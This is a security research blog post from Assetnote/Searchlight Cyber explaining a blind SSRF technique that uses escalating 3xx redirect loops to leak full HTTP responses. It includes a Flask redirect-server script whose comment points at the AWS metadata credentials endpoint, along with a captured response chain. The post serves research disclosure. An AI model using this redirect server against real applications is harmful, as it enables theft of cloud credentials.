---
title: "Novel SSRF Technique Involving HTTP Redirect Loops › Searchlight Cyber"
tags:
   - Cloud Security
   - HTTP Redirects
   - SSRF
   - libcurl
   - Security Vulnerability
link: https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/
date: 2025-07-20
description: "A novel SSRF technique utilizing HTTP redirect loops has been identified, exploiting applications that mishandle redirect responses. By crafting a controlled redirect server, attackers can circumvent restrictions and capture full HTTP responses, including sensitive metadata from cloud services. This method capitalizes on applications that fail on JSON parsing for certain HTTP codes, revealing critical security credentials under specific conditions. Notably, redirecting through an increasing sequence of 3xx status codes allows attackers to bypass limitations imposed by libraries like libcurl, presenting a significant risk in enterprise environments. Security teams should review handling of HTTP redirects to mitigate these vulnerabilities."
---

[Skip to content](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/#section-1)

June 23, 2025

# Novel SSRF Technique Involving HTTP Redirect Loops

June 23, 2025

Security research

[Shubham Shah](https://slcyber.io/author/shubham-shah/)

# Novel SSRF Technique Involving HTTP Redirect Loops

Blind Server-Side Request Forgery bugs are tricky to exploit, and obtaining the full HTTP response is one of the primary goals with any SSRF vulnerability. With modern cloud architectures, leaking the full HTTP response can often lead to cloud environment compromise if we can obtain the security credentials from the metadata IP.

However, what if you’re in a situation where the application just refuses to return the full HTTP response? Perhaps it’s performing some parsing logic, and your response does not fit its specifications, leading to an uneventful parsing error. These were the same challenges we faced recently when looking at widely used enterprise software.

We saw some unexpected behavior in this software that led to the leakage of the full redirect chain, including the final 200 OK response. We wanted to take some time today to blog about the issue, as it could lead to other SSRF vulnerabilities being exploitable in a similar way. Since this technique was surprisingly successful in this popular enterprise product, this pattern may hold true elsewhere.

This software was using native C++ bindings and libcurl under the hood. While we started loading the binaries into Ghidra, we surprisingly discovered the novel SSRF technique before Ghidra had even finished its analysis process.

### SSRF Testing Flow

Our typical SSRF testing flow involves interrogating the way the application responds to specific status codes. We started with understanding if the application could follow redirects. If this is true, we can then check how many redirects it can follow (MAX\_REDIRECTS) and how it responds in this scenario.

These attempts were not successful. With a single redirect or a few redirects, the application would fail with a JSON parsing error such as `Exception: Invalid JSON`. When increasing the number of redirects, we found that the application followed up to 30 redirects but would fail with a different exception: `NetworkException` with no `Invalid JSON` error.

Since the above attempts did not lead to a full response being leaked, we moved on to testing HTTP status codes that may be treated differently (such as 401 and 500). This is where we found our first lead within this application. On a 500 HTTP status code response, the application gave us the full HTTP response.

While this was a good start, the keys to the kingdom in this case were the security credentials exposed via the cloud metadata IP. The response for this URL is a 200, and there is no way to get the status code of this response to be a 500.

Since we knew that the application was following redirects for 3xx status codes, intuitively, in a true black box fashion, we had a theory that maybe certain status codes in the 3xx range could trigger the same error state as a 500 status code. We knew that following too many redirects (above 30) would lead to a `NetworkException` error, and following just a few led to a JSON parsing error, but what if we iterated through more 3xx status codes?

We created a basic Flask server that had the following logic:

```python hljs
@app.route('/redir', methods=['GET', 'POST'])
def redir():
    """Handle redirects with loop counter - after 10 redirects, go to final SSRF location."""
    # Get the current redirect count from query parameter, default to 0
    redirect_count = int(request.args.get('count', 0))

    # Increment the counter
    redirect_count += 1
    status_code = 301 + redirect_count
    # If we've reached 10 redirects, redirect to our desired location
    # To grab AWS metadata keys, you would hit http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-here
    if redirect_count >= 10:
        return redirect("http://example.com", code=302)
    print("trying: " + str(status_code))
    # Otherwise, redirect back to /redir with incremented counter
    return redirect(f"/redir?count={redirect_count}", code=status_code)

@app.route('/start', methods=['POST', 'GET'])
def start():
    """Starting point for redirect loop."""
    return redirect("/redir", code=302)

```

The above code performs a redirect loop, incrementing the HTTP status code on each subsequent request. When exploiting the SSRF issue by pointing it to a URL hosting the above logic, the application responded with the full HTTP redirect chain and responses:

```http hljs
HTTP/1.1 305 USE PROXY
Date: Sun, 01 Jun 2025 02:43:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=4

HTTP/1.1 306 SWITCH PROXY
Date: Sun, 01 Jun 2025 02:43:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=5

HTTP/1.1 307 TEMPORARY REDIRECT
Date: Sun, 01 Jun 2025 02:43:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=6

HTTP/1.1 308 PERMANENT REDIRECT
Date: Sun, 01 Jun 2025 02:43:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=7

HTTP/1.1 309 UNKNOWN
Date: Sun, 01 Jun 2025 02:43:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=8

HTTP/1.1 310 UNKNOWN
Date: Sun, 01 Jun 2025 02:43:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 215
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: /redir?count=9

HTTP/1.1 302 FOUND
Date: Sun, 01 Jun 2025 02:43:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 225
Connection: keep-alive
server: Werkzeug/2.2.3 Python/3.10.12
location: https://example.com

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Type: text/html
ETag: "84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"
Last-Modified: Mon, 13 Jan 2025 20:11:20 GMT
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 648
Cache-Control: max-age=1824
Date: Sun, 01 Jun 2025 02:43:21 GMT
Alt-Svc: h3=":443"; ma=93600,h3-29=":443"; ma=93600,quic=":443"; ma=93600; v="43"
Connection: keep-alive

<!doctype html>

... omitted for brevity ... (full response)

```

This was really surprising, but our goal was achieved! We used this technique to obtain the AWS metadata credentials successfully.

### But why did it work?

This drove us nuts. Was there something special about the 305 status code? Even though we performed a redirect from 301 to 310, why did we only get the HTTP responses from status code 305 and beyond?

Was this an issue with libcurl? After extensive analysis of the libcurl source code and this application’s binary, we don’t think so.

Instead, we believe that the application was happy to follow a few redirects (and failing on JSON parsing) and was not happy about following more than the max redirects configured for libcurl. However, there was an error state when it followed more than five redirects, not handled by libcurl but rather by the application itself.

This technique may sound obscure to you, but it has now worked for us in several situations where we would not have been able to see the full HTTP response for 200 OK responses, but could see the full HTTP response for 500 status codes.

So, the next time you’re working on a difficult blind SSRF vulnerability, remember this research post. You might be surprised by the outcome!

* * *

### About Assetnote

Searchlight Cyber’s ASM solution, [Assetnote](https://slcyber.io/dark-web-security-products/attack-surface-management-tool/), provides industry-leading attack surface management and adversarial exposure validation solutions, helping organizations identify and remediate security vulnerabilities before they can be exploited. Customers receive security alerts and recommended mitigations simultaneously with any disclosures made to third-party vendors. Visit our [attack surface management page](https://slcyber.io/dark-web-security-products/attack-surface-management-tool/) to learn more about out platform and [the research we do](https://slcyber.io/dark-web-security-products/attack-surface-management-tool/security-research/).

### Share this post

#### in this article

[SSRF Testing Flow](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/#ssrf-testing-flow)

[But why did it work?](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/#but-why-did-it-work?)

[About Assetnote](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/#about-assetnote)

## Related Content

![Post Icon](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2017%2017'%3E%3C/svg%3E)
Research

### RCE in the Most Popular Survey Software You’ve Never Heard Of

[Find out more](https://slcyber.io/assetnote-security-research-center/rce-in-the-most-popular-survey-software-youve-never-heard-of/)

![Post Icon](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2017%2017'%3E%3C/svg%3E)
Research

### Abusing Windows, .NET quirks, and Unicode Normalization to exploit DNN (DotNetNuke)

[Find out more](https://slcyber.io/assetnote-security-research-center/abusing-windows-net-quirks-and-unicode-normalization-to-exploit-dnn-dotnetnuke/)

![Post Icon](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2017%2017'%3E%3C/svg%3E)
Research

### How we got persistent XSS on every AEM cloud site, thrice

[Find out more](https://slcyber.io/assetnote-security-research-center/how-we-got-persistent-xss-on-every-aem-cloud-site-thrice/)

![Post Icon](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2017%2017'%3E%3C/svg%3E)
Research

### Loose Types Sink Ships: Pre-Authentication SQL Injection in Halo ITSM

[Find out more](https://slcyber.io/assetnote-security-research-center/loose-types-sink-ships-pre-authentication-sql-injection-in-halo-itsm/)

![Post Icon](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2017%2017'%3E%3C/svg%3E)
Research

### Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)

[Find out more](https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927/)

![Post Icon](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2017%2017'%3E%3C/svg%3E)
Research

### Sitecore: Unsafe Deserialisation Again! (CVE-2025-27218)

[Find out more](https://slcyber.io/assetnote-security-research-center/sitecore-unsafe-deserialisation-again-cve-2025-27218/)

## Book your demo: Identify cyber threats earlier– before they impact your business

Searchlight Cyber is used by security professionals and leading investigators to surface criminal activity and protect businesses. Book your demo to find out how Searchlight can:

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2033'%3E%3C/svg%3E)

**Enhance your security** with advanced automated dark web monitoring and investigation tools

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2033'%3E%3C/svg%3E)

**Continuously monitor for threats**, including ransomware groups targeting your organization

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2033'%3E%3C/svg%3E)

**Prevent costly cyber incidents** and meet cybersecurity compliance requirements and regulations

## Fill in the form to get you demo

First name\*

Last name\*

Company email\*

Job title\*

Phone number\*

Country Name\*

Please SelectAfghanistanÅland IslandsAlbaniaAlgeriaAmerican SamoaAndorraAngolaAnguillaAntarcticaAntigua and BarbudaArgentinaArmeniaArubaAsia/Pacific RegionAustraliaAustriaAzerbaijanBahamasBahrainBangladeshBarbadosBelarusBelgiumBelizeBeninBermudaBhutanBoliviaBosnia and HerzegovinaBotswanaBouvet IslandBrazilBritish Indian Ocean TerritoryBritish Virgin IslandsBruneiBulgariaBurkina FasoBurundiCambodiaCameroonCanadaCape VerdeCaribbean NetherlandsCayman IslandsCentral African RepublicChadChileChinaChristmas IslandCocos (Keeling) IslandsColombiaComorosCongoCook IslandsCosta RicaCote d'IvoireCroatiaCubaCuraçaoCyprusCzech RepublicDemocratic Republic of the CongoDenmarkDjiboutiDominicaDominican RepublicEast TimorEcuadorEgyptEl SalvadorEquatorial GuineaEritreaEstoniaEthiopiaEuropeFalkland IslandsFaroe IslandsFijiFinlandFranceFrench GuianaFrench PolynesiaFrench Southern and Antarctic LandsGabonGambiaGeorgiaGermanyGhanaGibraltarGreeceGreenlandGrenadaGuadeloupeGuamGuatemalaGuernseyGuineaGuinea-BissauGuyanaHaitiHeard Island and McDonald IslandsHondurasHong KongHungaryIcelandIndiaIndonesiaIranIraqIrelandIsle of ManIsraelItalyJamaicaJapanJerseyJordanKazakhstanKenyaKiribatiKosovoKuwaitKyrgyzstanLaosLatviaLebanonLesothoLiberiaLibyaLiechtensteinLithuaniaLuxembourgMacauMacedonia (FYROM)MadagascarMalawiMalaysiaMaldivesMaliMaltaMarshall IslandsMartiniqueMauritaniaMauritiusMayotteMexicoMicronesiaMoldovaMonacoMongoliaMontenegroMontserratMoroccoMozambiqueMyanmar (Burma)NamibiaNauruNepalNetherlandsNetherlands AntillesNew CaledoniaNew ZealandNicaraguaNigerNigeriaNiueNorfolk IslandNorth KoreaNorthern Mariana IslandsNorwayOmanPakistanPalauPalestinePanamaPapua New GuineaParaguayPeruPhilippinesPitcairn IslandsPolandPortugalPuerto RicoQatarRéunionRomaniaRussiaRwandaSaint BarthélemySaint HelenaSaint Kitts and NevisSaint LuciaSaint MartinSaint Pierre and MiquelonSaint Vincent and the GrenadinesSamoaSan MarinoSao Tome and PrincipeSaudi ArabiaSenegalSerbiaSeychellesSierra LeoneSingaporeSint MaartenSlovakiaSloveniaSolomon IslandsSomaliaSouth AfricaSouth Georgia and the South Sandwich IslandsSouth KoreaSouth SudanSpainSri LankaSudanSurinameSvalbard and Jan MayenSwazilandSwedenSwitzerlandSyriaTaiwanTajikistanTanzaniaThailandTogoTokelauTongaTrinidad and TobagoTunisiaTurkeyTurkmenistanTurks and Caicos IslandsTuvaluU.S. Virgin IslandsUgandaUkraineUnited Arab EmiratesUnited KingdomUnited StatesUnited States Minor Outlying IslandsUruguayUzbekistanVanuatuVatican CityVenezuelaVietnamWallis and FutunaWestern SaharaYemenZambiaZimbabwe

What are you interested in?\*

First Touch UTM Content

First Touch UTM Campaign

First Touch UTM Term

First Touch UTM Source

Last Touch UTM Campaign

Last Touch UTM Content

First Touch UTM Medium

Last Touch UTM Medium

Last Touch UTM Term

Last Touch UTM Source

By submitting my contact information, I consent to the processing of my data by Searchlight Cyber, including Searchlight Cyber contacting me. For more information read our [privacy policy](https://www.slcyber.io/privacy-policy).

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)

[Privacy](https://www.google.com/intl/en/policies/privacy/) \- [Terms](https://www.google.com/intl/en/policies/terms/)
